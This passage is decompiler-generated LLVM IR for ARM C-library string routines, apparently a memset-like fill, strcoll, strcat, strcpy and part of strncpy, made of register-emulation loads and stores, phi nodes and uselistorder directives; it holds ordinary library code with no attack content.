  %v2_d5c458 = icmp eq i32 %v1_d5c457, 0
  store i1 %v2_d5c458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_d5c458, label %dec_label_pc_d5d4, label %bb

bb:                                               ; preds = %dec_label_pc_d5bc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_d5bc ]
  %v3_d5c859 = phi i32 [ %v6_d5c8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_d5bc ]
  %v4_d5c8 = inttoptr i32 %v3_d5c859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_d5c8, align 1
  %v5_d5c8 = load i32, i32* @r3, align 4
  %v6_d5c8 = add i32 %v5_d5c8, 1
  store i32 %v6_d5c8, i32* @r3, align 4
  %v0_d5cc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_d5d8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_d5cc.pr, label %dec_label_pc_d5d4, label %.thread

.thread:                                          ; preds = %bb
  %v2_d5cc = add i32 %v0_d5d8.pr.pre, -1
  store i32 %v2_d5cc, i32* %r2.global-to-local, align 4
  %v1_d5c4 = urem i32 %v6_d5c8, 4
  %v2_d5c4 = icmp eq i32 %v1_d5c4, 0
  store i1 %v2_d5c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d5c4, label %dec_label_pc_d5d4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_d5c8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_d5c8.pre to i8
  br label %bb

dec_label_pc_d5d4:                                ; preds = %.thread, %bb, %dec_label_pc_d5bc
  %v0_d5e028 = phi i32 [ %tmp, %dec_label_pc_d5bc ], [ %v6_d5c8, %bb ], [ %v6_d5c8, %.thread ]
  %v0_d5d8.pr = phi i32 [ %arg3, %dec_label_pc_d5bc ], [ %v0_d5d8.pr.pre, %bb ], [ %v2_d5cc, %.thread ]
  %v0_d5d4 = load i32, i32* @r1, align 4
  store i32 %v0_d5d4, i32* @ip, align 4
  %v8_d5d810 = icmp eq i32 %v0_d5d8.pr, 8
  store i1 %v8_d5d810, i1* %cpsr_z.global-to-local, align 1
  %v5_d5dc11 = icmp slt i32 %v0_d5d8.pr, 8
  br i1 %v5_d5dc11, label %dec_label_pc_d618, label %dec_label_pc_d5e0.preheader

dec_label_pc_d5e0.preheader:                      ; preds = %dec_label_pc_d5d4
  %v1_d5e046 = inttoptr i32 %v0_d5e028 to i32*
  store i32 %v0_d5d4, i32* %v1_d5e046, align 4
  %v3_d5e047 = add i32 %v0_d5e028, 4
  %v4_d5e048 = inttoptr i32 %v3_d5e047 to i32*
  %v5_d5e049 = load i32, i32* @ip, align 4
  store i32 %v5_d5e049, i32* %v4_d5e048, align 4
  %v6_d5e050 = add i32 %v0_d5e028, 8
  store i32 %v6_d5e050, i32* @r3, align 4
  %v0_d5e451 = load i32, i32* %r2.global-to-local, align 4
  %v1_d5e452 = add i32 %v0_d5e451, -8
  store i32 %v1_d5e452, i32* %r2.global-to-local, align 4
  %v5_d5ec53 = icmp slt i32 %v1_d5e452, 8
  br i1 %v5_d5ec53, label %dec_label_pc_d5e0.dec_label_pc_d618.loopexit_crit_edge, label %dec_label_pc_d5f0

dec_label_pc_d5f0:                                ; preds = %dec_label_pc_d5e0.preheader, %dec_label_pc_d5d8.dec_label_pc_d5e0_crit_edge
  %v6_d5e055 = phi i32 [ %v6_d5e0, %dec_label_pc_d5d8.dec_label_pc_d5e0_crit_edge ], [ %v6_d5e050, %dec_label_pc_d5e0.preheader ]
  %v0_d5e054 = phi i32 [ %v12_d60c, %dec_label_pc_d5d8.dec_label_pc_d5e0_crit_edge ], [ %v0_d5e028, %dec_label_pc_d5e0.preheader ]
  %v1_d5f0 = inttoptr i32 %v6_d5e055 to i32*
  %v2_d5f0 = load i32, i32* @r1, align 4
  store i32 %v2_d5f0, i32* %v1_d5f0, align 4
  %v3_d5f0 = add i32 %v0_d5e054, 12
  %v4_d5f0 = inttoptr i32 %v3_d5f0 to i32*
  %v5_d5f0 = load i32, i32* @ip, align 4
  store i32 %v5_d5f0, i32* %v4_d5f0, align 4
  %v6_d5f0 = add i32 %v0_d5e054, 16
  store i32 %v6_d5f0, i32* @r3, align 4
  %v0_d5f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d5f4 = add i32 %v0_d5f4, -8
  store i32 %v1_d5f4, i32* %r2.global-to-local, align 4
  %v5_d5fc = icmp slt i32 %v1_d5f4, 8
  br i1 %v5_d5fc, label %dec_label_pc_d5f0.dec_label_pc_d618.loopexit_crit_edge, label %dec_label_pc_d600

dec_label_pc_d600:                                ; preds = %dec_label_pc_d5f0
  %v1_d600 = inttoptr i32 %v6_d5f0 to i32*
  %v2_d600 = load i32, i32* @r1, align 4
  store i32 %v2_d600, i32* %v1_d600, align 4
  %v3_d600 = add i32 %v0_d5e054, 20
  %v4_d600 = inttoptr i32 %v3_d600 to i32*
  %v5_d600 = load i32, i32* @ip, align 4
  store i32 %v5_d600, i32* %v4_d600, align 4
  %v6_d600 = add i32 %v0_d5e054, 24
  store i32 %v6_d600, i32* @r3, align 4
  %v0_d604 = load i32, i32* %r2.global-to-local, align 4
  %v1_d604 = add i32 %v0_d604, -8
  store i32 %v1_d604, i32* %r2.global-to-local, align 4
  %v5_d60c = icmp slt i32 %v1_d604, 8
  br i1 %v5_d60c, label %dec_label_pc_d600.dec_label_pc_d618.loopexit_crit_edge, label %dec_label_pc_d5d8

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d600
  %v7_d60c = inttoptr i32 %v6_d600 to i32*
  %v8_d60c = load i32, i32* @r1, align 4
  store i32 %v8_d60c, i32* %v7_d60c, align 4
  %v9_d60c = add i32 %v0_d5e054, 28
  %v10_d60c = inttoptr i32 %v9_d60c to i32*
  %v11_d60c = load i32, i32* @ip, align 4
  store i32 %v11_d60c, i32* %v10_d60c, align 4
  %v12_d60c = add i32 %v0_d5e054, 32
  store i32 %v12_d60c, i32* @r3, align 4
  %v6_d610 = load i32, i32* %r2.global-to-local, align 4
  %v7_d610 = add i32 %v6_d610, -8
  store i32 %v7_d610, i32* %r2.global-to-local, align 4
  %v5_d5dc = icmp slt i32 %v7_d610, 8
  br i1 %v5_d5dc, label %dec_label_pc_d5d8.dec_label_pc_d618.loopexit_crit_edge, label %dec_label_pc_d5d8.dec_label_pc_d5e0_crit_edge

dec_label_pc_d5d8.dec_label_pc_d5e0_crit_edge:    ; preds = %dec_label_pc_d5d8
  %v2_d5e0.pre = load i32, i32* @r1, align 4
  %v1_d5e0 = inttoptr i32 %v12_d60c to i32*
  store i32 %v2_d5e0.pre, i32* %v1_d5e0, align 4
  %v3_d5e0 = add i32 %v0_d5e054, 36
  %v4_d5e0 = inttoptr i32 %v3_d5e0 to i32*
  %v5_d5e0 = load i32, i32* @ip, align 4
  store i32 %v5_d5e0, i32* %v4_d5e0, align 4
  %v6_d5e0 = add i32 %v0_d5e054, 40
  store i32 %v6_d5e0, i32* @r3, align 4
  %v0_d5e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d5e4 = add i32 %v0_d5e4, -8
  store i32 %v1_d5e4, i32* %r2.global-to-local, align 4
  %v5_d5ec = icmp slt i32 %v1_d5e4, 8
  br i1 %v5_d5ec, label %dec_label_pc_d5e0.dec_label_pc_d618.loopexit_crit_edge, label %dec_label_pc_d5f0

dec_label_pc_d5d8.dec_label_pc_d618.loopexit_crit_edge: ; preds = %dec_label_pc_d5d8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d618

dec_label_pc_d5e0.dec_label_pc_d618.loopexit_crit_edge: ; preds = %dec_label_pc_d5d8.dec_label_pc_d5e0_crit_edge, %dec_label_pc_d5e0.preheader
  %v1_d5e4.lcssa = phi i32 [ %v1_d5e452, %dec_label_pc_d5e0.preheader ], [ %v1_d5e4, %dec_label_pc_d5d8.dec_label_pc_d5e0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d618

dec_label_pc_d5f0.dec_label_pc_d618.loopexit_crit_edge: ; preds = %dec_label_pc_d5f0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d618

dec_label_pc_d600.dec_label_pc_d618.loopexit_crit_edge: ; preds = %dec_label_pc_d600
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d618

dec_label_pc_d618:                                ; preds = %dec_label_pc_d5d4, %dec_label_pc_d5d8.dec_label_pc_d618.loopexit_crit_edge, %dec_label_pc_d5e0.dec_label_pc_d618.loopexit_crit_edge, %dec_label_pc_d5f0.dec_label_pc_d618.loopexit_crit_edge, %dec_label_pc_d600.dec_label_pc_d618.loopexit_crit_edge, %entry
  %v0_d620 = phi i32 [ %arg3, %entry ], [ %v1_d604, %dec_label_pc_d600.dec_label_pc_d618.loopexit_crit_edge ], [ %v1_d5f4, %dec_label_pc_d5f0.dec_label_pc_d618.loopexit_crit_edge ], [ %v1_d5e4.lcssa, %dec_label_pc_d5e0.dec_label_pc_d618.loopexit_crit_edge ], [ %v7_d610, %dec_label_pc_d5d8.dec_label_pc_d618.loopexit_crit_edge ], [ %v0_d5d8.pr, %dec_label_pc_d5d4 ]
  %v2_d618 = icmp eq i32 %v0_d620, 0
  store i1 %v2_d618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d618, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_d618
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_d618
  %v1_d620 = sub i32 7, %v0_d620
  store i32 %v1_d620, i32* %r2.global-to-local, align 4
  %v3_d624 = mul i32 %v1_d620, 4
  %v4_d624 = add i32 %v3_d624, ptrtoint (i32* @global_var_d62c.497 to i32)
  call void @__pseudo_branch(i32 %v4_d624)
  %v0_d62c = load i32, i32* @r1, align 4
  %v1_d62c = trunc i32 %v0_d62c to i8
  %v2_d62c = load i32, i32* @r3, align 4
  %v3_d62c = inttoptr i32 %v2_d62c to i8*
  store i8 %v1_d62c, i8* %v3_d62c, align 1
  %v4_d62c = load i32, i32* @r3, align 4
  %v5_d62c = add i32 %v4_d62c, 1
  store i32 %v5_d62c, i32* %r3.global-to-local, align 4
  %v0_d630 = load i32, i32* @r1, align 4
  %v1_d630 = trunc i32 %v0_d630 to i8
  %v3_d630 = inttoptr i32 %v5_d62c to i8*
  store i8 %v1_d630, i8* %v3_d630, align 1
  %v4_d630 = load i32, i32* %r3.global-to-local, align 4
  %v5_d630 = add i32 %v4_d630, 1
  store i32 %v5_d630, i32* %r3.global-to-local, align 4
  %v0_d634 = load i32, i32* @r1, align 4
  %v1_d634 = trunc i32 %v0_d634 to i8
  %v3_d634 = inttoptr i32 %v5_d630 to i8*
  store i8 %v1_d634, i8* %v3_d634, align 1
  %v4_d634 = load i32, i32* %r3.global-to-local, align 4
  %v5_d634 = add i32 %v4_d634, 1
  store i32 %v5_d634, i32* %r3.global-to-local, align 4
  %v0_d638 = load i32, i32* @r1, align 4
  %v1_d638 = trunc i32 %v0_d638 to i8
  %v3_d638 = inttoptr i32 %v5_d634 to i8*
  store i8 %v1_d638, i8* %v3_d638, align 1
  %v4_d638 = load i32, i32* %r3.global-to-local, align 4
  %v5_d638 = add i32 %v4_d638, 1
  store i32 %v5_d638, i32* %r3.global-to-local, align 4
  %v0_d63c = load i32, i32* @r1, align 4
  %v1_d63c = trunc i32 %v0_d63c to i8
  %v3_d63c = inttoptr i32 %v5_d638 to i8*
  store i8 %v1_d63c, i8* %v3_d63c, align 1
  %v4_d63c = load i32, i32* %r3.global-to-local, align 4
  %v5_d63c = add i32 %v4_d63c, 1
  store i32 %v5_d63c, i32* %r3.global-to-local, align 4
  %v0_d640 = load i32, i32* @r1, align 4
  %v1_d640 = trunc i32 %v0_d640 to i8
  %v3_d640 = inttoptr i32 %v5_d63c to i8*
  store i8 %v1_d640, i8* %v3_d640, align 1
  %v4_d640 = load i32, i32* %r3.global-to-local, align 4
  %v5_d640 = add i32 %v4_d640, 1
  store i32 %v5_d640, i32* %r3.global-to-local, align 4
  %v0_d644 = load i32, i32* @r1, align 4
  %v1_d644 = trunc i32 %v0_d644 to i8
  %v3_d644 = inttoptr i32 %v5_d640 to i8*
  store i8 %v1_d644, i8* %v3_d644, align 1
  %v4_d644 = load i32, i32* %r3.global-to-local, align 4
  %v5_d644 = add i32 %v4_d644, 1
  store i32 %v5_d644, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_d5e0, { 1, 0 }
  uselistorder i32 %v12_d60c, { 1, 2, 0 }
  uselistorder i32 %v0_d5e054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_d5d8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_d5c8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_d5bc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 0, 4, 3, 1, 5, 9, 8, 2, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_d618, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_d5f0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_d654.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_d654 = phi i32 [ %v0_d654.pre, %bb ], [ %v5_d654, %bb3 ]
  %v0_d650 = phi i32 [ %tmp, %bb ], [ %v5_d650, %bb3 ]
  %v1_d650 = inttoptr i32 %v0_d650 to i8*
  %v2_d650 = load i8, i8* %v1_d650, align 1
  %v1_d654 = inttoptr i32 %v0_d654 to i8*
  %v2_d654 = load i8, i8* %v1_d654, align 1
  %v3_d654 = zext i8 %v2_d654 to i32
  %v5_d654 = add i32 %v0_d654, 1
  store i32 %v5_d654, i32* @r1, align 4
  %v2_d658 = icmp eq i8 %v2_d650, 0
  br i1 %v2_d658, label %.dec_label_pc_d664_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_d650 = add i32 %v0_d650, 1
  %v3_d650 = zext i8 %v2_d650 to i32
  %v10_d65c = icmp eq i8 %v2_d650, %v2_d654
  br i1 %v10_d65c, label %entry, label %dec_label_pc_d664

.dec_label_pc_d664_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_d664

dec_label_pc_d664:                                ; preds = %bb3, %.dec_label_pc_d664_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_d664_crit_edge ], [ %v3_d650, %bb3 ]
  %v2_d664.pre-phi = sub nsw i32 %.pn, %v3_d654
  ret i32 %v2_d664.pre-phi

; uselistorder directives
  uselistorder i32 %v5_d654, { 1, 0 }
  uselistorder i8 %v2_d650, { 0, 2, 1 }
  uselistorder i32 %v0_d650, { 1, 0 }
  uselistorder i32 %v0_d654, { 1, 0 }
  uselistorder label %dec_label_pc_d664, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d6d4

dec_label_pc_d6d4:                                ; preds = %dec_label_pc_d6d4, %entry
  %v0_d6d4 = phi i32 [ %v5_d6d4, %dec_label_pc_d6d4 ], [ %tmp, %entry ]
  %v1_d6d4 = inttoptr i32 %v0_d6d4 to i8*
  %v2_d6d4 = load i8, i8* %v1_d6d4, align 1
  %v5_d6d4 = add i32 %v0_d6d4, 1
  store i32 %v5_d6d4, i32* %r2.global-to-local, align 4
  %v2_d6d8 = icmp eq i8 %v2_d6d4, 0
  store i1 %v2_d6d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d6d8, label %dec_label_pc_d6e0, label %dec_label_pc_d6d4

dec_label_pc_d6e0:                                ; preds = %dec_label_pc_d6d4
  %v1_d6e0 = add i32 %v0_d6d4, -1
  store i32 %v1_d6e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d6e4

dec_label_pc_d6e4:                                ; preds = %dec_label_pc_d6e4, %dec_label_pc_d6e0
  %v2_d6ec = phi i32 [ %v6_d6ec, %dec_label_pc_d6e4 ], [ %v1_d6e0, %dec_label_pc_d6e0 ]
  %v0_d6e4 = load i32, i32* @r1, align 4
  %v1_d6e4 = inttoptr i32 %v0_d6e4 to i8*
  %v2_d6e4 = load i8, i8* %v1_d6e4, align 1
  %v5_d6e4 = add i32 %v0_d6e4, 1
  store i32 %v5_d6e4, i32* @r1, align 4
  %v2_d6e8 = icmp eq i8 %v2_d6e4, 0
  store i1 %v2_d6e8, i1* %cpsr_z.global-to-local, align 1
  %v3_d6ec = add i32 %v2_d6ec, 1
  %v4_d6ec = inttoptr i32 %v3_d6ec to i8*
  store i8 %v2_d6e4, i8* %v4_d6ec, align 1
  %v5_d6ec = load i32, i32* %r2.global-to-local, align 4
  %v6_d6ec = add i32 %v5_d6ec, 1
  store i32 %v6_d6ec, i32* %r2.global-to-local, align 4
  %v0_d6f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d6f0, label %dec_label_pc_d6f4, label %dec_label_pc_d6e4

dec_label_pc_d6f4:                                ; preds = %dec_label_pc_d6e4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_d6ec, { 1, 0 }
  uselistorder i32 %v5_d6d4, { 1, 0 }
  uselistorder i32 %v0_d6d4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_d7081 = load i32, i32* @r1, align 4
  %v1_d7082 = inttoptr i32 %v0_d7081 to i8*
  %v2_d7083 = load i8, i8* %v1_d7082, align 1
  %v2_d70c5 = icmp eq i8 %v2_d7083, 0
  store i1 %v2_d70c5, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_d7083, i8* %arg1, align 1
  br i1 %v2_d70c5, label %dec_label_pc_d718, label %dec_label_pc_d700

dec_label_pc_d700:                                ; preds = %entry, %dec_label_pc_d700
  %v0_d700 = load i32, i32* @r1, align 4
  %v1_d700 = add i32 %v0_d700, 1
  store i32 %v1_d700, i32* @r1, align 4
  %v0_d704 = load i32, i32* %r2.global-to-local, align 4
  %v1_d704 = add i32 %v0_d704, 1
  store i32 %v1_d704, i32* %r2.global-to-local, align 4
  %v1_d708 = inttoptr i32 %v1_d700 to i8*
  %v2_d708 = load i8, i8* %v1_d708, align 1
  %v2_d70c = icmp eq i8 %v2_d708, 0
  store i1 %v2_d70c, i1* %cpsr_z.global-to-local, align 1
  %v3_d710 = inttoptr i32 %v1_d704 to i8*
  store i8 %v2_d708, i8* %v3_d710, align 1
  %v0_d714 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d714, label %dec_label_pc_d718, label %dec_label_pc_d700

dec_label_pc_d718:                                ; preds = %dec_label_pc_d700, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_d700, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_d71c = icmp eq i32 %arg2, 3
  store i1 %v7_d71c, i1* %cpsr_z.global-to-local, align 1
  %v0_d720 = load i32, i32* @lr, align 4
  store i32 %v0_d720, i32* %stack_var_-4, align 4
  %v1_d724 = add i32 %arg1, -1
  store i32 %v1_d724, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_d7a0, label %dec_label_pc_d72c

dec_label_pc_d72c:                                ; preds = %entry
  %v3_d72c = udiv i32 %arg2, 4
  store i32 %v3_d72c, i32* %lr.global-to-local, align 4
  %v0_d730.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_d730

dec_label_pc_d730:                                ; preds = %dec_label_pc_d77c, %dec_label_pc_d72c
  %v2_d738 = phi i32 [ %v6_d770, %dec_label_pc_d77c ], [ %v1_d724, %dec_label_pc_d72c ]
  %v0_d730 = phi i32 [ %v1_d780, %dec_label_pc_d77c ], [ %v0_d730.pre, %dec_label_pc_d72c ]
  %v1_d730 = inttoptr i32 %v0_d730 to i8*
  %v2_d730 = load i8, i8* %v1_d730, align 1
  %v3_d730 = zext i8 %v2_d730 to i32
  store i32 %v3_d730, i32* %r3.global-to-local, align 4
  %v2_d734 = icmp eq i8 %v2_d730, 0
  store i1 %v2_d734, i1* %cpsr_z.global-to-local, align 1
  %v3_d738 = add i32 %v2_d738, 1
  %v4_d738 = inttoptr i32 %v3_d738 to i8*
  store i8 %v2_d730, i8* %v4_d738, align 1
  %v5_d738 = load i32, i32* @ip, align 4
  %v6_d738 = add i32 %v5_d738, 1
  store i32 %v6_d738, i32* @ip, align 4
  %v0_d73c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d73c, label %dec_label_pc_d78c, label %dec_label_pc_d740

dec_label_pc_d740:                                ; preds = %dec_label_pc_d730
  %v0_d740 = load i32, i32* @r1, align 4
  %v1_d740 = add i32 %v0_d740, 1
  %v2_d740 = inttoptr i32 %v1_d740 to i8*
  %v3_d740 = load i8, i8* %v2_d740, align 1
  %v4_d740 = zext i8 %v3_d740 to i32
  store i32 %v4_d740, i32* %r3.global-to-local, align 4
  %v2_d744 = icmp eq i8 %v3_d740, 0
  store i1 %v2_d744, i1* %cpsr_z.global-to-local, align 1
  %v3_d748 = add i32 %v5_d738, 2
  %v4_d748 = inttoptr i32 %v3_d748 to i8*
  store i8 %v3_d740, i8* %v4_d748, align 1
  %v5_d748 = load i32, i32* @ip, align 4
  %v6_d748 = add i32 %v5_d748, 1
  store i32 %v6_d748, i32* @ip, align 4
  %v0_d74c = load i32, i32* @r1, align 4
  %v1_d74c = add i32 %v0_d74c, 1
  store i32 %v1_d74c, i32* %r1.global-to-local, align 4
  %v0_d750 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d750, label %dec_label_pc_d78c, label %dec_label_pc_d754

dec_label_pc_d754:                                ; preds = %dec_label_pc_d740
  %v1_d754 = add i32 %v0_d74c, 2
  %v2_d754 = inttoptr i32 %v1_d754 to i8*
  %v3_d754 = load i8, i8* %v2_d754, align 1
  %v4_d754 = zext i8 %v3_d754 to i32
  store i32 %v4_d754, i32* %r3.global-to-local, align 4
  %v2_d758 = icmp eq i8 %v3_d754, 0
  store i1 %v2_d758, i1* %cpsr_z.global-to-local, align 1
  %v3_d75c = add i32 %v5_d748, 2
  %v4_d75c = inttoptr i32 %v3_d75c to i8*
  store i8 %v3_d754, i8* %v4_d75c, align 1
  %v5_d75c = load i32, i32* @ip, align 4
  %v6_d75c = add i32 %v5_d75c, 1
  store i32 %v6_d75c, i32* @ip, align 4
  %v0_d760 = load i32, i32* %r1.global-to-local, align 4
  %v1_d760 = add i32 %v0_d760, 1
  store i32 %v1_d760, i32* %r1.global-to-local, align 4
  %v0_d764 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d764, label %dec_label_pc_d78c, label %dec_label_pc_d768

dec_label_pc_d768:                                ; preds = %dec_label_pc_d754
  %v1_d768 = add i32 %v0_d760, 2
  %v2_d768 = inttoptr i32 %v1_d768 to i8*
  %v3_d768 = load i8, i8* %v2_d768, align 1
  %v4_d768 = zext i8 %v3_d768 to i32
  store i32 %v4_d768, i32* %r3.global-to-local, align 4
  %v2_d76c = icmp eq i8 %v3_d768, 0
  store i1 %v2_d76c, i1* %cpsr_z.global-to-local, align 1
  %v3_d770 = add i32 %v5_d75c, 2
  %v4_d770 = inttoptr i32 %v3_d770 to i8*
  store i8 %v3_d768, i8* %v4_d770, align 1
  %v5_d770 = load i32, i32* @ip, align 4
  %v6_d770 = add i32 %v5_d770, 1
  store i32 %v6_d770, i32* @ip, align 4
  %v0_d774 = load i32, i32* %r1.global-to-local, align 4
  %v1_d774 = add i32 %v0_d774, 1
  store i32 %v1_d774, i32* %r1.global-to-local, align 4
  %v0_d778 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d778, label %dec_label_pc_d78c, label %dec_label_pc_d77c

dec_label_pc_d77c:                                ; preds = %dec_label_pc_d768
  %v0_d77c = load i32, i32* %lr.global-to-local, align 4
  %v1_d77c = add i32 %v0_d77c, -1
  store i32 %v1_d77c, i32* %lr.global-to-local, align 4
  %v7_d77c = icmp eq i32 %v0_d77c, 1
  store i1 %v7_d77c, i1* %cpsr_z.global-to-local, align 1
  %v1_d780 = add i32 %v0_d774, 2
  store i32 %v1_d780, i32* @r1, align 4
  br i1 %v7_d77c, label %dec_label_pc_d7a0, label %dec_label_pc_d730

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d768, %dec_label_pc_d754, %dec_label_pc_d740, %dec_label_pc_d730
  %v1_d78c = phi i32 [ %v6_d770, %dec_label_pc_d768 ], [ %v6_d75c, %dec_label_pc_d754 ], [ %v6_d748, %dec_label_pc_d740 ], [ %v6_d738, %dec_label_pc_d730 ]
  %v2_d78c1 = sub i32 %arg1, %v1_d78c
  %v2_d790 = add i32 %v2_d78c1, %arg2
  %v1_d794 = add i32 %v2_d790, -1
  store i32 %v1_d794, i32* %r3.global-to-local, align 4
  %v7_d794 = icmp eq i32 %v2_d790, 1
  store i1 %v7_d794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d794, label %dec_label_pc_d7d0, label %dec_label_pc_d7c0

dec_label_pc_d7a0:                                ; preds = %dec_label_pc_d77c, %entry
  %v2_d7b07 = phi i32 [ %v1_d724, %entry ], [ %v6_d770, %dec_label_pc_d77c ]
  %v1_d7a0 = urem i32 %arg2, 4
  store i32 %v1_d7a0, i32* %r3.global-to-local, align 4
  %v2_d7a0 = icmp eq i32 %v1_d7a0, 0
  store i1 %v2_d7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d7a0, label %dec_label_pc_d7d0, label %dec_label_pc_d7a8

dec_label_pc_d7a8:                                ; preds = %dec_label_pc_d7a0, %dec_label_pc_d7b8.dec_label_pc_d7a8_crit_edge
  %v2_d7b0 = phi i32 [ %v6_d7b0, %dec_label_pc_d7b8.dec_label_pc_d7a8_crit_edge ], [ %v2_d7b07, %dec_label_pc_d7a0 ]
  %v0_d7ac = phi i32 [ %v0_d7ac.pre, %dec_label_pc_d7b8.dec_label_pc_d7a8_crit_edge ], [ %v1_d7a0, %dec_label_pc_d7a0 ]
  %v0_d7a8 = load i32, i32* @r1, align 4
  %v1_d7a8 = inttoptr i32 %v0_d7a8 to i8*
  %v2_d7a8 = load i8, i8* %v1_d7a8, align 1
  %v3_d7a8 = zext i8 %v2_d7a8 to i32
  store i32 %v3_d7a8, i32* %r2.global-to-local, align 4
  %v5_d7a8 = add i32 %v0_d7a8, 1
  store i32 %v5_d7a8, i32* @r1, align 4
  %v1_d7ac = add i32 %v0_d7ac, -1
  store i32 %v1_d7ac, i32* %r3.global-to-local, align 4
  %v7_d7ac = icmp eq i32 %v0_d7ac, 1
  store i1 %v7_d7ac, i1* %cpsr_z.global-to-local, align 1
  %v3_d7b0 = add i32 %v2_d7b0, 1
  %v4_d7b0 = inttoptr i32 %v3_d7b0 to i8*
  store i8 %v2_d7a8, i8* %v4_d7b0, align 1
  %v5_d7b0 = load i32, i32* @ip, align 4
  %v6_d7b0 = add i32 %v5_d7b0, 1
  store i32 %v6_d7b0, i32* @ip, align 4
  %v0_d7b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d7b4, label %dec_label_pc_d7d0, label %dec_label_pc_d7b8

dec_label_pc_d7b8:                                ; preds = %dec_label_pc_d7a8
  %v0_d7b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_d7b8 = icmp eq i32 %v0_d7b8, 0
  store i1 %v2_d7b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d7b8, label %dec_label_pc_d7c0, label %dec_label_pc_d7b8.dec_label_pc_d7a8_crit_edge

dec_label_pc_d7b8.dec_label_pc_d7a8_crit_edge:    ; preds = %dec_label_pc_d7b8
  %v0_d7ac.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d7a8

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d7b8, %dec_label_pc_d78c
  %v2_d7c810 = phi i32 [ %v1_d78c, %dec_label_pc_d78c ], [ %v6_d7b0, %dec_label_pc_d7b8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d7c4

